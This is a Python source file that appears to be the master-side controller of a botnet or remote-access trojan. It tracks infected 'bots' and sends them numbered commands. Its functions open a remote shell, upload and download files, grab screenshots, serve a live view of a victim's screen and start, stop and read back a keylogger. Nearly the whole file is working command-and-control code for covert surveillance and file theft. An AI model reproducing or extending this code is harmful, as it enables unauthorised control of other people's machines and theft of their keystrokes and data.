# Date: 06/07/2018
# Author: Pure-L0G1C
# Description: Interface for the master

from re import match
from lib import const
from hashlib import sha256
from time import time, sleep
from os import urandom, path
from threading import Thread
from datetime import datetime
from os import getcwd, path, remove
from . import ssh, sftp, sscreenshare

######## Screenshare ########


class ScreenShare:

    screen_src = path.join(getcwd(), 'templates', 'screen.html')

    def __init__(self, bot, update):
        self.sscreenshare = sscreenshare.SScreenShare(
            const.PRIVATE_IP,
            const.FTP_PORT
        )

        self.bot_id = bot['bot_id']
        self.shell = bot['shell']
        self.update = update

    @property
    def is_alive(self):
        return self.sscreenshare.is_alive

    def start(self, code):
        print('Starting screenshare ...')

        self.shell.send(code=code, args=self.update)
        Thread(target=self.sscreenshare.start, daemon=True).start()

    def stop(self):
        print('Stopping screenshare ...')

        self.shell.send(code=16)
        self.sscreenshare.stop()

        if path.exists(ScreenShare.screen_src):
            try:
                remove(ScreenShare.screen_src)
            except:
                pass

    def close(self):
        self.stop()


######## FTP ########

class FTP(object):

    def __init__(self, file, bot, download=True):
        self.sftp = sftp.sFTP(
            const.PRIVATE_IP, const.FTP_PORT, max_time=60, verbose=True)
        self.bot_id = bot['bot_id']
        self.shell = bot['shell']
        self.download = download
        self.is_alive = False
        self.success = False
        self.time = None
        self.file = file

    def send(self, code, file=None):
        if not path.exists(file):
            return

        self.shell.send(code=code, args=file)
        self.is_alive = True

        self.sftp.send(file)
        self.is_alive = False

        self.time = self.sftp.time_elapsed
        self.success = True if self.sftp.error_code != -1 else False

    def recv(self, code, file=None):
        self.shell.send(code=code, args=file)
        self.is_alive = True
        self.sftp.recv(code=code)
        self.is_alive = False
        self.time = self.sftp.time_elapsed
        self.success = True if self.sftp.error_code != -1 else False

    def close(self):
        self.sftp.close()
        self.is_alive = False


######## Interface ########


class Interface(object):

    def __init__(self):
        self.bots = {}
        self.ssh = None
        self.ftp = None
        self.screenshare = None
        self.sig = self.signature

    def close(self):
        if self.ftp:
            self.ftp.close()
            self.ftp = None

        if self.ssh:
            self.ssh.close()
            self.ssh = None

        if self.screenshare:
            self.screenshare.close()
            self.screenshare = None

        self.disconnect_all()

    def gen_bot_id(self, uuid):
        bot_ids = [self.bots[bot]['bot_id'] for bot in self.bots]
        while 1:
            bot_id = sha256((sha256(urandom(64 * 32) + urandom(64 * 64)
                                    ).digest().hex() + uuid).encode()).digest().hex()
            if not bot_id in bot_ids:
                break
        return bot_id

    @property
    def signature(self):
        bots = b''
        for bot in self.bots:
            bot_id = self.bots[bot]['bot_id']
            bot_id = bot_id[:8] + bot_id[-8:]
            bots += bot_id.encode()
        return sha256(bots).digest().hex()

    def is_connected(self, uuid):
        for bot in self.bots:
            if self.bots[bot]['uuid'] == uuid:
                return True
        return False

    def connect_client(self, sess_obj, conn_info, shell):
        uuid = conn_info['args']['sys_info']['uuid']

        if self.is_connected(uuid):
            self.close_sess(sess_obj, shell)
        else:
            bot_id = self.gen_bot_id(uuid)
            self.bots[sess_obj] = {'bot_id': bot_id, 'uuid': uuid,
                                   'intel': conn_info['args'], 'shell': shell, 'session': sess_obj}
            self.sig = self.signature

    def close_sess(self, sess_obj, shell_obj):
        print('Closing session ...')
        shell_obj.is_alive = False
        shell_obj.send(code=7, args=None)  # 7 - disconnect

        sess_obj.close()
        if sess_obj in self.bots:
            del self.bots[sess_obj]
        self.sig = self.signature

    def disconnect_client(self, sess_obj):
        print('Disconnecting client ...')
        if sess_obj in self.bots:
            self.bots[sess_obj]['shell'].is_alive = False
            bot_id = self.bots[sess_obj]['bot_id']

            if self.ftp:
                if self.ftp.bot_id == bot_id:
                    self.ftp.close()
                    self.ftp = None

            self.close_sess(sess_obj, self.bots[sess_obj]['shell'])
            self.sig = self.signature

    def disconnect_all(self):
        for bot in [self.bots[bot] for bot in self.bots]:
            bot['session'].close()
        self.sig = self.signature

    def get_bot(self, bot_id):
        for bot in self.bots:
            if self.bots[bot]['bot_id'] == bot_id:
                return self.bots[bot]

    def ssh_obj(self, bot_id):
        bot = self.get_bot(bot_id)

        if bot:
            if self.ssh:
                self.ssh.close()

            self.ssh = ssh.SSH(const.PRIVATE_IP, const.SSH_PORT,
                               max_time=30, verbose=True)
            sock_obj = self.ssh.start()

            if sock_obj:
                t = Thread(target=self.ssh.serve, args=[sock_obj])
                t.daemon = True
                t.start()

                bot['session'].send(code=1)
                return self.ssh
            else:
                self.ssh.close()
                self.ssh = None

    def ssh_exe(self, cmd):
        return self.ssh.send(cmd)

    def ftp_obj(self, bot_id, cmd_id, file, override):
        bot = self.get_bot(bot_id)
        if not bot:
            return ''

        if cmd_id == 3:
            if not path.exists(file):
                return 'Upload process failed; the file {} was not found'.format(file)

        if self.ftp:
            if all([self.ftp.is_alive, not override]):
                return 'Already {} {} {} {}. Use --override option to override this process'.format('Downloading' if self.ftp.download else 'Uploading',
                                                                                                    self.ftp.file, 'from' if self.ftp.download else 'to', self.ftp.bot_id[:8])
            self.ftp.close()
            del self.ftp

        if self.screenshare:
            if self.screenshare.is_alive and not override:
                return 'Viewing the screen of {}. Use --override option to override this process'.format(
                    self.screenshare.bot_id[:8]
                )

            self.screenshare.close()
            del self.screenshare
            self.screenshare = None

        self.ftp = FTP(file, bot, download=False if cmd_id == 3 else True)
        ftp_func = self.ftp.send if cmd_id == 3 else self.ftp.recv
        Thread(target=ftp_func, args=[cmd_id, file], daemon=True).start()

        return '{} process started successfully'.format('Download' if self.ftp.download else 'Upload')

    def ftp_status(self):
        if not self.ftp:
            return 'No file transfer in progress'
        if self.ftp.is_alive:
            return '{} {} {} {}. Check back in 1 minute'.format('Downloading' if self.ftp.download else 'Uploading',
                                                                self.ftp.file, 'from' if self.ftp.download else 'to', self.ftp.bot_id[:8])
        else:
            return 'Attempted to {} {} {} {}. The process {} a success. Time-elapsed: {}(sec)'.format('download' if self.ftp.download else 'upload',
                                                                                                      self.ftp.file, 'from' if self.ftp.download else 'to',
                                                                                                      self.ftp.bot_id[:8], 'was' if self.ftp.success else 'was not', self.ftp.time)

    def write_screen_scr(self, update):
        html = '''
        <!DOCTYPE html>
        <html lang="en">
            <head>
                <meta charset="UTF-8" />
                <meta name="viewport" content="width=device-width, initial-scale=1.0" />
                <meta http-equiv="X-UA-Compatible" content="ie=edge" />
                <title>Screenshare</title>
            </head>
            <body>
                <div id="container">
                    <img src="../static/img/screen.png" alt="" height="512" width="1024" id="img" />
                </div>

                <script>
                    window.onload = function() {{
                        var image = document.getElementById('img');

                        function updateImage() {{
                            image.src = image.src.split('?')[0] + '?' + new Date().getTime();
                        }}

                        setInterval(updateImage, {});
                    }};    

                    window.onfocus = function() {{
                        location.reload();
                    }};           
                </script>

                <style>
                    body {{
                        background: #191919;
                    }}

                    img {{
                        border-radius: 5px;
                    }}

                    #container {{
                        text-align: center;
                        padding-top: 8%;
                    }}
                </style>
            </body>
        </html>
        '''.format(update * 1000)

        with open(ScreenShare.screen_src, 'wt') as f:
            f.write(html)

    def screenshare_obj(self, bot_id, cmd_id, update, override):
        bot = self.get_bot(bot_id)

        if not bot:
            return ''

        if self.ftp:
            if self.ftp.is_alive and not override:
                return 'Already {} {} {} {}. Use --override option to override this process'.format('Downloading' if self.ftp.download else 'Uploading',
                                                                                                    self.ftp.file, 'from' if self.ftp.download else 'to', self.ftp.bot_id[:8])
            self.ftp.close()
            del self.ftp
            self.ftp = None

        if self.screenshare:
            if self.screenshare.is_alive and not override:
                return 'Already viewing the screen of {}. Use --override option to override this process'.format(
                    self.screenshare.bot_id[:8]
                )

            self.screenshare.close()
            self.screenshare.update = update
            self.screenshare.shell = bot['shell']
            self.screenshare.bot_id = bot['bot_id']
        else:
            self.screenshare = ScreenShare(bot, update)

        self.screenshare.start(cmd_id)
        self.write_screen_scr(update)

        return 'Screenshare is being hosted at the URL: {}'.format(ScreenShare.screen_src)

    def execute_cmd_by_id(self, bot_id, cmd_id, args):
        override = True if '--override' in args else False
        if not cmd_id.isdigit():
            return 'Failed to send command'

        cmd_id = int(cmd_id)

        if override:
            args.pop(args.index('--override'))

        if cmd_id == 1:
            return self.ftp_status()

        if cmd_id == 15:
            if '-1' in args:
                args.remove('-1')

            if not len(args):
                return 'Please provide an update time in seconds'

            update = ''.join(args[0]).strip()

            if not update:
                return 'Please provide an update time in seconds'

            try:
                update = float(update)
            except ValueError:
                return 'Please provide an integer for update time'

            return self.screenshare_obj(bot_id, cmd_id, update, override)

        if cmd_id == 16:
            if not self.screenshare:
                return 'Screenshare is inactive'

            if not self.screenshare.is_alive:
                return 'Screenshare is inactive'

            self.screenshare.stop()
            return 'Stopped screenshare ...'

        if cmd_id == 17:
            if not self.screenshare:
                return 'Screenshare is inactive'

            if not self.screenshare.is_alive:
                return 'Screenshare is inactive'

            return 'Viewing the screen of {}\nUpdating every {} seconds\nURL: {}'.format(
                self.screenshare.bot_id[:8], self.screenshare.update, ScreenShare.screen_src
            )

        elif any([cmd_id == 3, cmd_id == 4, cmd_id == 5]):
            return self.ftp_obj(bot_id, cmd_id, ' '.join(args[0:]) if cmd_id != 5 else 'a screenshot', override)
        else:
            bot = self.get_bot(bot_id)
            if bot:
                bot['shell'].send(code=cmd_id, args=args)
                if cmd_id == 12:
                    if not bot['shell'].keylogging:
                        bot['shell'].keylogging = True
                    else:
                        return 'Keylogger is already active'
                if cmd_id == 13:
                    if bot['shell'].keylogging:
                        bot['shell'].keylogging = False
                    else:
                        return 'Keylogger is already inactive'
                if all([cmd_id == 14, not bot['shell'].keylogging]):
                    return 'Keylogger is inactive'
                return self.keystrokes(bot['shell']) if cmd_id == 14 else 'Command sent successfully'
        return 'Failed to send command'

    def keystrokes(self, bot_shell):
        while all([bot_shell.is_alive, not bot_shell.keystrokes]):
            pass
        try:
            if all([bot_shell.is_alive, bot_shell.keystrokes]):
                keystrokes = bot_shell.keystrokes
                bot_shell.keystrokes = None
                return keystrokes if keystrokes != '-1' else ''
        except:
            pass

    def valid_thread(self, thread):
        return True if thread.isdigit() else False

    def valid_ip(self, ip):
        return False if not match(r'^(?!0)(?!.*\.$)((1?\d?\d|25[0-5]|2[0-4]\d)(\.|$)){4}$', ip) else True

    def valid_port(self, port):
        _port = str(port).strip()

        if not len(_port):
            return False
        else:
            #  check if number
            for item in _port:
                if not item.isdigit():
                    return False

            # check if number starts with a zero
            if int(_port[0]) == 0:
                return False

            # check if number is larger than 65535
            if int(_port) > 65535:
                return False
            return True
